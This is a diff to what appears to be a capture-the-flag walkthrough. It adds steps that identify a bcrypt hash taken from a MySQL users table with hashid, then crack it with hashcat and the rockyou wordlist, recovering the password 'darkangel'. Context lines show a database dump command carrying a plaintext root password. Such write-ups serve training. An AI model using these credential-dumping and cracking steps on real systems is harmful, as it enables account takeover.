@@ -77,7 +77,6 @@ Now that we've got a shell, lets see what network services are listening for con
 
 - This reveals 2 new services that we didnt see with our nmap scan because they were not exposed to the outside world.
 
-	- Telnet on port 23
 	
 	- MySQL on port 3306
 
@@ -107,7 +106,24 @@ Theres a users table. Lets access it:
 
 	mysql -u root -p'SuperSecureCraft123Pass!' -e "SELECT username, admin, email, password FROM orion.users;"
 
-Now we've got a hash, lets crack it. 
+Now we've got a hash, lets crack it. But first we'll need to determine what kind of hash it is and what hashcat mode to use, so we'll run:
+
+	hashid -m '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS'
+
+- As we see, its a Blowfish cipher, and the Hashcat mode is 3200.
+
+Lets use rockyou.txt as our wordlist:
+
+	tar -xzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz -C /tmp/
+
+Now we can try to crack it:
+
+	hashcat -m 3200 hash.txt /tmp/rockyou.txt
+
+- Looks like they chose a simple passwd, its: darkangel
+
+
+
 
 
 
